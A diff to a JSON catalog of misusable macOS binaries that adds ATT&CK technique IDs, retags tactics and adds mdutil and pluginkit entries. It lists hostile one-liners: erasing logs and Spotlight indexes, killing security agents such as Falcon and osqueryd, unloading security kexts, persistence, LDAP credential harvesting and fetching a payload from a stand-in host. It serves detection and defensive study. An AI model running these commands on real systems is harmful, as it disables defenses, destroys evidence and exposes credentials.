@@ -1759,8 +2244,11 @@
         "description": "Send SIGKILL to immediately terminate processes that may ignore the default termination signal.",
         "code": "killall -9 Terminal",
         "tactics": [
-          "Defense Evasion",
+          "Defense Impairment",
           "Impact"
+        ],
+        "techniques": [
+          "T1489"
         ],
         "tags": [
           "processes",
@@ -1815,6 +2303,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1518.001"
+        ],
         "tags": []
       },
       {
@@ -1822,7 +2313,10 @@
         "description": "unload invokes a kext's stop function and ends its IOKit lifecycle, stopping a legacy security kext from observing the system. It requires root and fails if another loaded kext holds a reference to the target (shown by the Refs column of showloaded). The kext stays in its collection, so the change does not survive a reboot. Applies only to products still shipping a kext rather than a System Extension.",
         "code": "sudo kmutil unload --bundle-identifier <TARGET_KEXT_BUNDLE_ID>",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1685"
         ],
         "tags": []
       },
@@ -1831,7 +2325,10 @@
         "description": "unload --class-name terminates all instances of a named IOService class while leaving the kext loaded. Adding --personalities-only also removes the kext's personalities so the driver cannot restart. Either form stops the driver from doing work while leaving the kext visible in showloaded output. Requires root.",
         "code": "sudo kmutil unload --class-name <TARGET_IOSERVICE_CLASS>",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1685"
         ],
         "tags": []
       },
@@ -1843,6 +2340,9 @@
           "Persistence",
           "Privilege Escalation"
         ],
+        "techniques": [
+          "T1547.006"
+        ],
         "tags": []
       },
       {
@@ -1851,7 +2351,10 @@
         "code": "kmutil configure-boot --custom-boot-object <PAYLOAD_MACHO> --volume /Volumes/<TARGET_VOLUME>",
         "tactics": [
           "Persistence",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1542"
         ],
         "tags": []
       },
@@ -1860,8 +2363,11 @@
         "description": "trigger-panic-medic is meant to recover a machine from a kext that panics at boot. It removes the auxiliary kext collection and revokes every kext approval on the next boot, which on a managed fleet drops any third-party kernel extension the organization deployed, including a security vendor's kext, and forces user re-approval before any can load again. It runs only in Recovery Mode, needing the same access as configure-boot.",
         "code": "kmutil trigger-panic-medic",
         "tactics": [
-          "Defense Evasion",
+          "Defense Impairment",
           "Impact"
+        ],
+        "techniques": [
+          "T1685"
         ],
         "tags": []
       }
@@ -1916,6 +2422,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1033"
+        ],
         "tags": [
           "oneliner",
           "account"
@@ -1928,6 +2437,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1033"
+        ],
         "tags": [
           "oneliner",
           "account"
@@ -1939,6 +2451,9 @@
         "code": "last | grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1018"
         ],
         "tags": [
           "oneliner",
@@ -1978,6 +2493,9 @@
           "Execution",
           "Persistence"
         ],
+        "techniques": [
+          "T1569.001"
+        ],
         "tags": [
           "bash",
           "zsh",
@@ -1990,6 +2508,9 @@
         "code": "launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist",
         "tactics": [
           "Persistence"
+        ],
+        "techniques": [
+          "T1543.001"
         ],
         "tags": []
       }
@@ -2041,6 +2562,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1087.002"
+        ],
         "tags": [
           "ldap",
           "active-directory",
@@ -2053,6 +2577,10 @@
         "code": "ldapsearch -Y GSSAPI -Q -H ldap://<DC_IP> -b \"DC=<DOMAIN>,DC=<TLD>\" -LLL \"(objectClass=computer)\" dNSHostName operatingSystem",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1018",
+          "T1087.002"
         ],
         "tags": [
           "ldap",
@@ -2068,6 +2596,10 @@
           "Credential Access",
           "Discovery"
         ],
+        "techniques": [
+          "T1558.003",
+          "T1087.002"
+        ],
         "tags": [
           "ldap",
           "kerberoasting",
@@ -2081,6 +2613,10 @@
         "tactics": [
           "Credential Access",
           "Discovery"
+        ],
+        "techniques": [
+          "T1558.004",
+          "T1087.002"
         ],
         "tags": [
           "ldap",
@@ -2096,6 +2632,9 @@
           "Discovery",
           "Collection"
         ],
+        "techniques": [
+          "T1087.002"
+        ],
         "tags": [
           "ldap",
           "active-directory",
@@ -2108,6 +2647,9 @@
         "code": "ldapsearch -x -H ldap://<DC_IP> -D \"<USER>@<DOMAIN>\" -w '<PASSWORD>' -b \"DC=<DOMAIN>,DC=<TLD>\" -LLL \"(objectClass=computer)\" ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime",
         "tactics": [
           "Credential Access"
+        ],
+        "techniques": [
+          "T1552"
         ],
         "tags": [
           "ldap",
@@ -2157,7 +2699,10 @@
         "description": "An attacker can cover up their tracks by removing all log messages using the following command. Requires root privileges.",
         "code": "log erase --all",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1685.006"
         ],
         "tags": [
           "requires-root"
@@ -2169,6 +2714,9 @@
         "code": "log show --info --debug --predicate 'eventMessage CONTAINS[d] \"eyJ\"'",
         "tactics": [
           "Credential Access"
+        ],
+        "techniques": [
+          "T1552"
         ],
         "tags": [
           "bash",
@@ -2209,6 +2757,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1518"
+        ],
         "tags": []
       },
       {
@@ -2217,6 +2768,9 @@
         "code": "/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -E \"path:|bindings:|name: | more\"",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1518"
         ],
         "tags": []
       },
@@ -2227,6 +2781,7 @@
         "tactics": [
           "Impact"
         ],
+        "techniques": [],
         "tags": []
       }
     ],
@@ -2268,6 +2823,9 @@
           "Reconnaissance",
           "Discovery"
         ],
+        "techniques": [
+          "T1083"
+        ],
         "tags": [
           "bash",
           "zsh",
@@ -2282,6 +2840,10 @@
           "Reconnaissance",
           "Discovery"
         ],
+        "techniques": [
+          "T1552.001",
+          "T1083"
+        ],
         "tags": [
           "bash",
           "zsh",
@@ -2295,7 +2857,11 @@
         "tactics": [
           "Reconnaissance",
           "Discovery",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1518",
+          "T1083"
         ],
         "tags": [
           "osascript",
@@ -2336,7 +2902,10 @@
         "description": "Use mdls to validate payload download sources and timestamps to guard against sandbox executions.",
         "code": "mdls -name \"kMDItemWhereFroms\" -name \"kMDItemDownloadedDate\"",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1083"
         ],
         "tags": [
           "genieo",
@@ -2350,6 +2919,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1083"
+        ],
         "tags": [
           "cleanmaster"
         ]
@@ -2361,7 +2933,11 @@
         "tactics": [
           "Execution",
           "Collection",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1140",
+          "T1059.004"
         ],
         "tags": [
           "finder-comment",
@@ -2391,6 +2967,97 @@
     ]
   },
   {
+    "name": "mdutil",
+    "author": "Brendan Chamberlain (@infosecB)",
+    "short_description": "Manage Spotlight metadata indexing on local and external volumes.",
+    "full_description": "mdutil manages the Spotlight metadata indexes stored on each volume. Spotlight indexes are used by mdfind, the Finder, and incident responders to locate files, and the on-disk Spotlight store can retain metadata useful during forensic investigations. An attacker with root can use mdutil to stop indexing so staged files do not appear in Spotlight searches, or erase and remove existing indexes to destroy forensic evidence. Any user can query indexing status.",
+    "created": "2026-11-07",
+    "example_use_cases": [
+      {
+        "name": "Check Spotlight indexing status of all volumes",
+        "description": "Print the indexing status of every mounted volume. Volumes with indexing disabled are less likely to have staged files discovered through Spotlight searches. This command does not require root.",
+        "code": "mdutil -sa",
+        "tactics": [
+          "Discovery"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash",
+          "spotlight"
+        ]
+      },
+      {
+        "name": "Disable Spotlight indexing to hide staged files",
+        "description": "Turn off Spotlight indexing for the data volume or for all volumes. Files written afterwards are not added to the index, so they do not appear in mdfind or Finder search results.",
+        "code": "sudo mdutil -i off /System/Volumes/Data\nsudo mdutil -a -i off",
+        "tactics": [
+          "Stealth"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash",
+          "spotlight"
+        ]
+      },
+      {
+        "name": "Erase the Spotlight index to remove forensic artifacts",
+        "description": "Erase and rebuild the Spotlight index, discarding metadata about files that were previously indexed, including files that have since been deleted.",
+        "code": "sudo mdutil -E /System/Volumes/Data",
+        "tactics": [
+          "Stealth"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash",
+          "spotlight",
+          "anti-forensics"
+        ]
+      },
+      {
+        "name": "Remove the Spotlight index from an external volume",
+        "description": "Delete the Spotlight index directory from a volume such as a USB drive used to stage or exfiltrate data, then disable indexing so it is not rebuilt.",
+        "code": "sudo mdutil -X /Volumes/USB\nsudo mdutil -i off /Volumes/USB",
+        "tactics": [
+          "Stealth"
+        ],
+        "techniques": [],
+        "tags": [
+          "bash",
+          "spotlight",
+          "anti-forensics",
+          "disk"
+        ]
+      }
+    ],
+    "paths": [
+      "/usr/bin/mdutil"
+    ],
+    "detections": [
+      {
+        "name": "Command-line detection: mdutil with -i off, -d, -E, or -X arguments",
+        "url": "N/A"
+      },
+      {
+        "name": "Process execution detection: mdutil executed by a script interpreter, an unsigned process, or as part of a sequence with other anti-forensics commands such as log erase or tmutil deletelocalsnapshots",
+        "url": "N/A"
+      }
+    ],
+    "resources": [
+      {
+        "name": "mdutil man page - SS64",
+        "url": "https://ss64.com/mac/mdutil.html"
+      },
+      {
+        "name": "Indicator Removal - MITRE ATT&CK",
+        "url": "https://attack.mitre.org/techniques/T1070/"
+      }
+    ],
+    "acknowledgements": []
+  },
+  {
     "name": "mktemp",
     "author": "Tim Peck (@B0bby_Tablez)",
     "short_description": "Create a temporary file or directory and return the file/directory name to stdout",
@@ -2402,8 +3069,9 @@
         "description": "The following command can be used to generate a random directory name for staging payloads",
         "code": "export tmpDir=\"$(mktemp -d /tmp/XXXXXXXXXXXX)\"",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
         ],
+        "techniques": [],
         "tags": [
           "payload"
         ]
@@ -2413,8 +3081,9 @@
         "description": "The following command can be used to generate a unique directory based on a template",
         "code": "TMP_DIR=\"mktemp -d -t x\"",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
         ],
+        "techniques": [],
         "tags": [
           "payload"
         ]
@@ -2455,6 +3124,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1016"
+        ],
         "tags": [
           "network",
           "configuration"
@@ -2466,6 +3138,9 @@
         "code": "networksetup -detectnewhardware",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1016"
         ],
         "tags": [
           "network",
@@ -2479,6 +3154,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1016"
+        ],
         "tags": [
           "network",
           "configuration"
@@ -2491,6 +3169,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1016"
+        ],
         "tags": [
           "network",
           "configuration"
@@ -2502,6 +3183,9 @@
         "code": "networksetup -getdnsservers Wi-Fi",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1016"
         ],
         "tags": [
           "network",
@@ -2516,6 +3200,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1016"
+        ],
         "tags": [
           "network",
           "configuration",
@@ -2528,6 +3215,9 @@
         "code": "networksetup -getwebproxy \"Wi-Fi\"",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1016"
         ],
         "tags": [
           "network",
@@ -2542,6 +3232,9 @@
         "tactics": [
           "Command and Control"
         ],
+        "techniques": [
+          "T1090"
+        ],
         "tags": [
           "network",
           "configuration",
@@ -2554,6 +3247,9 @@
         "code": "networksetup -setwebproxy \"Wi-Fi\" 46.226.108.171",
         "tactics": [
           "Command and Control"
+        ],
+        "techniques": [
+          "T1090"
         ],
         "tags": [
           "network",
@@ -2568,6 +3264,9 @@
         "tactics": [
           "Command and Control"
         ],
+        "techniques": [
+          "T1090"
+        ],
         "tags": [
           "network",
           "configuration",
@@ -2580,6 +3279,9 @@
         "code": "networksetup -setautoproxystate \"Wi-Fi\" on",
         "tactics": [
           "Command and Control"
+        ],
+        "techniques": [
+          "T1090"
         ],
         "tags": [
           "network",
@@ -2644,6 +3346,9 @@
           "Discovery",
           "Collection"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "monitoring",
           "surveillance",
@@ -2656,8 +3361,9 @@
         "code": "# Sender process\nnotifyutil -p com.example.hidden.channel -s com.example.hidden.channel 1337\n\n# Receiver process in another terminal/process\nnotifyutil -1 com.example.hidden.channel -g com.example.hidden.channel\n",
         "tactics": [
           "Command and Control",
-          "Defense Evasion"
+          "Stealth"
         ],
+        "techniques": [],
         "tags": [
           "ipc",
           "covert-channel",
@@ -2671,6 +3377,9 @@
         "tactics": [
           "Discovery",
           "Collection"
+        ],
+        "techniques": [
+          "T1016"
         ],
         "tags": [
           "network",
@@ -2686,10 +3395,12 @@
           "Collection",
           "Discovery"
         ],
+        "techniques": [
+          "T1614"
+        ],
         "tags": [
           "geolocation",
-          "monitoring",
-          "reconnaissance"
+          "monitoring"
         ]
       },
       {
@@ -2700,10 +3411,12 @@
           "Discovery",
           "Privilege Escalation"
         ],
+        "techniques": [
+          "T1033"
+        ],
         "tags": [
           "authentication",
-          "monitoring",
-          "privilege-escalation"
+          "monitoring"
         ]
       },
       {
@@ -2713,8 +3426,10 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
-          "reconnaissance",
           "enumeration"
         ]
       }
@@ -2770,8 +3485,11 @@
         "description": "Download file and ignore cert checking",
         "code": "nscurl -k https://google.com -o /private/tmp/google",
         "tactics": [
-          "Defense Evasion",
+          "Stealth",
           "Command and Control"
+        ],
+        "techniques": [
+          "T1105"
         ],
         "tags": []
       },
@@ -2780,8 +3498,11 @@
         "description": "Download file to the Downloads directory using -dl",
         "code": "nscurl https://google.com -dl",
         "tactics": [
-          "Defense Evasion",
+          "Stealth",
           "Command and Control"
+        ],
+        "techniques": [
+          "T1105"
         ],
         "tags": []
       },
@@ -2790,8 +3511,11 @@
         "description": "Download file to a designated directory using -dir",
         "code": "nscurl https://google.com -dir /private/tmp/google",
         "tactics": [
-          "Defense Evasion",
+          "Stealth",
           "Command and Control"
+        ],
+        "techniques": [
+          "T1105"
         ],
         "tags": []
       }
@@ -2839,6 +3563,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": []
       }
     ],
@@ -2875,6 +3602,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "bash",
           "zsh"
@@ -2886,6 +3616,9 @@
         "code": "odutil show sessions",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1033"
         ],
         "tags": [
           "bash",
@@ -2899,6 +3632,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "bash",
           "zsh"
@@ -2910,6 +3646,9 @@
         "code": "odutil show configuration /Contacts",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "bash",
@@ -2952,6 +3691,9 @@
         "tactics": [
           "Execution"
         ],
+        "techniques": [
+          "T1204.002"
+        ],
         "tags": [
           "application"
         ]
@@ -2962,6 +3704,9 @@
         "code": "open -g https://mypayload.io/payload.zip; sleep 3; killall Safari",
         "tactics": [
           "Execution"
+        ],
+        "techniques": [
+          "T1105"
         ],
         "tags": []
       }
@@ -2997,6 +3742,10 @@
         "tactics": [
           "Command and Control",
           "Resource Development"
+        ],
+        "techniques": [
+          "T1105",
+          "T1059.002"
         ],
         "tags": [
           "xcsset"
@@ -3035,11 +3784,13 @@
           "Collection",
           "Credential Access"
         ],
+        "techniques": [
+          "T1115"
+        ],
         "tags": [
           "clipboard",
           "bash",
-          "oneliner",
-          "osascript"
+          "oneliner"
         ]
       },
       {
@@ -3050,10 +3801,12 @@
           "Collection",
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
-          "systeminfo",
-          "oneliner",
-          "osascript"
+          "system-info",
+          "oneliner"
         ]
       },
       {
@@ -3063,10 +3816,12 @@
         "tactics": [
           "Credential Access"
         ],
+        "techniques": [
+          "T1056.002"
+        ],
         "tags": [
           "oneliner",
-          "prompt",
-          "osascript"
+          "prompt"
         ]
       },
       {
@@ -3076,9 +3831,11 @@
         "tactics": [
           "Execution"
         ],
+        "techniques": [
+          "T1059.007"
+        ],
         "tags": [
-          "jxa",
-          "osascript"
+          "jxa"
         ]
       },
       {
@@ -3087,11 +3844,14 @@
         "code": "osascript -e 'do shell script \"id\"'",
         "tactics": [
           "Execution",
-          "Defense Evasion",
+          "Stealth",
           "Privilege Escalation"
         ],
+        "techniques": [
+          "T1059.002",
+          "T1059.004"
+        ],
         "tags": [
-          "osascript",
           "do-shell-script",
           "oneliner"
         ]
@@ -3104,8 +3864,11 @@
           "Lateral Movement",
           "Execution"
         ],
+        "techniques": [
+          "T1021.004",
+          "T1059.002"
+        ],
         "tags": [
-          "osascript",
           "ssh",
           "remote-execution"
         ]
@@ -3117,8 +3880,10 @@
         "tactics": [
           "Lateral Movement"
         ],
+        "techniques": [
+          "T1021"
+        ],
         "tags": [
-          "osascript",
           "smb",
           "file-transfer",
           "oneliner"
@@ -3132,8 +3897,11 @@
           "Execution",
           "Lateral Movement"
         ],
+        "techniques": [
+          "T1059.002",
+          "T1021"
+        ],
         "tags": [
-          "osascript",
           "remote-apple-events",
           "remote-apple-services",
           "eppc",
@@ -3149,8 +3917,10 @@
           "Discovery",
           "Lateral Movement"
         ],
+        "techniques": [
+          "T1135"
+        ],
         "tags": [
-          "osascript",
           "remote-apple-events",
           "eppc",
           "finder",
@@ -3216,9 +3986,11 @@
         "tactics": [
           "Execution"
         ],
+        "techniques": [
+          "T1204.004"
+        ],
         "tags": [
-          "clipboard",
-          "pasteboard"
+          "clipboard"
         ]
       },
       {
@@ -3227,11 +3999,13 @@
         "code": "cat <STAGED_FILE> | pbcopy -pboard find",
         "tactics": [
           "Collection",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1074.001"
         ],
         "tags": [
           "clipboard",
-          "pasteboard",
           "staging"
         ]
       },
@@ -3240,11 +4014,13 @@
         "description": "Piping empty input to pbcopy overwrites the general pasteboard with nothing, discarding whatever the user had copied (for example a password copied from a manager). An attacker can use this to remove sensitive data after harvesting it, or to erase evidence that clipboard monitoring took place, before an investigator or DLP agent inspects the pasteboard. It requires only user-level code execution.",
         "code": "printf '' | pbcopy",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1070"
         ],
         "tags": [
-          "clipboard",
-          "pasteboard"
+          "clipboard"
         ]
       }
     ],
@@ -3300,6 +4076,9 @@
           "Credential Access",
           "Collection"
         ],
+        "techniques": [
+          "T1115"
+        ],
         "tags": [
           "bash",
           "oneliner"
@@ -3339,7 +4118,10 @@
         "description": "Terminate defensive processes like firewalls, AV, or monitoring tools.",
         "code": "pkill -f \"Little Snitch|ESET|osqueryd|Falcon\"",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1685"
         ],
         "tags": [
           "processes",
@@ -3351,7 +4133,10 @@
         "description": "Use the -9 signal to forcefully terminate processes that may not respond to normal termination signals. Useful for killing hung security tools.",
         "code": "pkill -9 osqueryd",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1685"
         ],
         "tags": [
           "processes",
@@ -3363,8 +4148,11 @@
         "description": "Terminate all processes belonging to a specific user, potentially ending user sessions or disrupting monitoring.",
         "code": "pkill -u username",
         "tactics": [
-          "Defense Evasion",
+          "Defense Impairment",
           "Impact"
+        ],
+        "techniques": [
+          "T1489"
         ],
         "tags": [
           "processes",
@@ -3376,7 +4164,10 @@
         "description": "Terminate system logging and monitoring processes to evade detection.",
         "code": "pkill -f \"syslog|auditd|osqueryd|esensor|nessusd\"",
         "tactics": [
-          "Defense Evasion"
+          "Defense Impairment"
+        ],
+        "techniques": [
+          "T1685"
         ],
         "tags": [
           "logging",
@@ -3388,8 +4179,11 @@
         "description": "Use exact matching with -x flag to kill specific process by exact name rather than pattern.",
         "code": "pkill -x com.apple.Safari",
         "tactics": [
-          "Defense Evasion",
+          "Defense Impairment",
           "Impact"
+        ],
+        "techniques": [
+          "T1489"
         ],
         "tags": [
           "processes"
@@ -3434,7 +4228,11 @@
         "code": "/usr/libexec/PlistBuddy -c \"Add :Label string <LABEL>\" ~/Library/LaunchAgents/<LABEL>.plist\n/usr/libexec/PlistBuddy -c \"Add :RunAtLoad bool true\" ~/Library/LaunchAgents/<LABEL>.plist\n/usr/libexec/PlistBuddy -c \"Add :StartInterval integer 3600\" ~/Library/LaunchAgents/<LABEL>.plist\n/usr/libexec/PlistBuddy -c \"Add :ProgramArguments array\" ~/Library/LaunchAgents/<LABEL>.plist\n/usr/libexec/PlistBuddy -c \"Add :ProgramArguments:0 string /bin/sh\" ~/Library/LaunchAgents/<LABEL>.plist\n/usr/libexec/PlistBuddy -c \"Add :ProgramArguments:1 string -c\" ~/Library/LaunchAgents/<LABEL>.plist\n/usr/libexec/PlistBuddy -c \"Add :ProgramArguments:2 string <PAYLOAD_PATH>\" ~/Library/LaunchAgents/<LABEL>.plist",
         "tactics": [
           "Persistence",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1543.001",
+          "T1543.004"
         ],
         "tags": [
           "plist"
@@ -3448,6 +4246,9 @@
           "Credential Access",
           "Persistence"
         ],
+        "techniques": [
+          "T1556"
+        ],
         "tags": []
       },
       {
@@ -3457,6 +4258,9 @@
         "tactics": [
           "Discovery",
           "Collection"
+        ],
+        "techniques": [
+          "T1082"
         ],
         "tags": [
           "lockscreen"
@@ -3469,6 +4273,9 @@
         "tactics": [
           "Command and Control"
         ],
+        "techniques": [
+          "T1105"
+        ],
         "tags": []
       },
       {
@@ -3477,6 +4284,9 @@
         "code": "/usr/libexec/PlistBuddy -c \"Print :CFBundleShortVersionString\" /Applications/<APP>.app/Contents/Info.plist",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1518"
         ],
         "tags": []
       }
@@ -3539,6 +4349,80 @@
     ]
   },
   {
+    "name": "pluginkit",
+    "author": "Brendan Chamberlain (@infosecB)",
+    "short_description": "Register, enable, disable, and enumerate app extensions (plug-ins) such as Finder Sync extensions.",
+    "full_description": "pluginkit manages the PlugInKit subsystem for the current user, which tracks app extensions such as Finder Sync, Quick Look, Share, and Safari web extensions. It can query the plug-in database, explicitly register extensions from arbitrary paths, and set the user election that controls whether an extension is used. Because it operates on the current user's database, no root access is required. Attackers can register and enable a malicious Finder Sync extension so that it is automatically launched by the system, enumerate installed extensions, and disable extensions belonging to security or data loss prevention products.",
+    "created": "2026-11-07",
+    "example_use_cases": [
+      {
+        "name": "Enumerate registered app extensions",
+        "description": "List all registered app extensions with their paths, versions, and parent applications. Filtering by extension point (protocol) identifies Finder Sync extensions, Quick Look previewers, and Safari web extensions. The leading + or - on each line shows whether the user has elected to use or ignore the extension.",
+        "code": "pluginkit -mAvvv\npluginkit -mAvvv -p com.apple.FinderSync\npluginkit -mA -p com.apple.Safari.web-extension",
+        "tactics": [
+          "Discovery"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash"
+        ]
+      },
+      {
+        "name": "Persist through a malicious Finder Sync extension",
+        "description": "Register a Finder Sync extension bundled with an attacker-controlled application, then elect to use it. Once enabled, the extension is launched automatically by the system whenever Finder runs, without a LaunchAgent or login item.",
+        "code": "pluginkit -a /Applications/Updater.app/Contents/PlugIns/UpdaterSync.appex\npluginkit -e use -i com.example.Updater.UpdaterSync",
+        "tactics": [
+          "Persistence"
+        ],
+        "techniques": [],
+        "tags": [
+          "bash",
+          "finder"
+        ]
+      },
+      {
+        "name": "Disable a security product's app extension",
+        "description": "Elect to ignore an extension by bundle ID, which stops it from being used for the current user. This can disable extensions that provide security or data loss prevention functionality, such as Finder Sync or Safari content-blocking extensions.",
+        "code": "pluginkit -e ignore -i <extension bundle ID>",
+        "tactics": [
+          "Defense Impairment"
+        ],
+        "techniques": [],
+        "tags": [
+          "oneliner",
+          "bash"
+        ]
+      }
+    ],
+    "paths": [
+      "/usr/bin/pluginkit"
+    ],
+    "detections": [
+      {
+        "name": "Finder Sync Plugin Registered and Enabled - Elastic",
+        "url": "https://www.elastic.co/guide/en/security/current/finder-sync-plugin-registered-and-enabled.html"
+      },
+      {
+        "name": "Command-line detection: pluginkit -a with an extension path outside /Applications or /System, or pluginkit -e ignore executed by a script interpreter or unsigned process",
+        "url": "N/A"
+      }
+    ],
+    "resources": [
+      {
+        "name": "Beyond the good ol' LaunchAgents - 26 - Finder Sync Plugins",
+        "url": "https://theevilbit.github.io/beyond/beyond_0026/"
+      },
+      {
+        "name": "Analyzing 'Mac File Opener' Persistence - Objective-See",
+        "url": "https://objective-see.org/blog/blog_0x11.html"
+      }
+    ],
+    "acknowledgements": [
+      "Csaba Fitzl (@theevilbit)"
+    ]
+  },
+  {
     "name": "plutil",
     "author": "Brendan Chamberlain (@infosecB)",
     "short_description": "Read, create or edit plist files.",
@@ -3550,7 +4434,10 @@
         "description": "plutil can be used to set the \"LSUIElement\" attribute to true which will force the targeted app to run without the UI and dock icon.",
         "code": "plutil -insert LSUIElement -string \"1\" /Applications/TargetApp.app/Contents/Info.plist",
         "tactics": [
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1564.003"
         ],
         "tags": [
           "plist"
@@ -3593,6 +4480,7 @@
           "Persistence",
           "Command and Control"
         ],
+        "techniques": [],
         "tags": [
           "schedule",
           "wakeorpoweron",
@@ -3604,9 +4492,9 @@
         "description": "As root, pmset can set the system, disk, and display idle-sleep timers to 0 (never) across all power sources. A value of 0 disables the timer entirely, so a laptop left on battery no longer sleeps and drops its network connection, keeping a long-running C2 channel or exfiltration session alive. Unlike caffeinate, which holds a transient assertion for the life of a process, this writes a persistent setting to com.apple.PowerManagement.plist that survives reboots and shows no owning process in the assertions list.",
         "code": "sudo pmset -a sleep 0 disksleep 0 displaysleep 0",
         "tactics": [
-          "Command and Control",
-          "Defense Evasion"
+          "Command and Control"
         ],
+        "techniques": [],
         "tags": [
           "sleep",
           "keep-awake",
@@ -3621,6 +4509,7 @@
           "Command and Control",
           "Persistence"
         ],
+        "techniques": [],
         "tags": [
           "womp",
           "wake-on-lan",
@@ -3634,6 +4523,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "user-activity"
         ]
@@ -3644,6 +4536,9 @@
         "code": "pmset -g assertions",
         "tactics": [
           "Discovery"
+        ],
+        "techniques": [
+          "T1057"
         ],
         "tags": [
           "assertions",
@@ -3656,8 +4551,9 @@
         "code": "sudo pmset -a destroyfvkeyonstandby 0",
         "tactics": [
           "Credential Access",
-          "Defense Evasion"
+          "Defense Impairment"
         ],
+        "techniques": [],
         "tags": [
           "filevault",
           "destroyfvkeyonstandby",
@@ -3716,6 +4612,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1082"
+        ],
         "tags": [
           "oneliner"
         ]
@@ -3726,6 +4625,9 @@
         "code": "profiles remove -identifier com.profile.identifier -password <password>",
         "tactics": [
           "Impact"
+        ],
+        "techniques": [
+          "T1685"
         ],
         "tags": [
           "oneliner"
@@ -3763,6 +4665,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1201"
+        ],
         "tags": []
       },
       {
@@ -3773,6 +4678,9 @@
           "Credential Access",
           "Discovery"
         ],
+        "techniques": [
+          "T1201"
+        ],
         "tags": []
       },
       {
@@ -3782,6 +4690,9 @@
         "tactics": [
           "Discovery"
         ],
+        "techniques": [
+          "T1087.001"
+        ],
         "tags": []
       },
       {
@@ -3789,9 +4700,10 @@
         "description": "-clearaccountpolicies removes the policy dictionary, including lockout thresholds, password expiry, and content requirements. Without -u it clears the global policy; with -u it clears a single account's. -setaccountpolicies replaces the dictionary from a plist, leaving a populated-looking policy whose contents the attacker controls. Both require root or an administrator supplied with -a.",
         "code": "sudo pwpolicy -clearaccountpolicies",
         "tactics": [
-          "Defense Evasion",
+          "Defense Impairment",
           "Persistence"
         ],
+        "techniques": [],
         "tags": [
           "policy"
         ]
@@ -3804,6 +4716,9 @@
           "Persistence",
           "Credential Access"
         ],
+        "techniques": [
+          "T1098"
+        ],
         "tags": [
           "password"
         ]
@@ -3814,7 +4729,10 @@
         "code": "sudo pwpolicy -u <TARGET_USER> -disableuser",
         "tactics": [
           "Impact",
-          "Defense Evasion"
+          "Stealth"
+        ],
+        "techniques": [
+          "T1531"
         ],
         "tags": []
       }
@@ -3854,6 +4772,7 @@
           "Command and Control",
           "Exfiltration"
         ],
+        "techniques": [],
         "tags": [
           "safari",
           "selenium"
@@ -3896,8 +4815,11 @@
         "description": "The following command can read and process sensitive files and redirects the output to a file..",
         "code": "say -f /home/user/sensitive-files -i  > loot.txt;",
         "tactics": [
-          "Defense Evasion",
+          "Stealth",
           "Collection"
+        ],
+        "techniques": [
+          "T1005"
         ],
         "tags": [
           "bash"
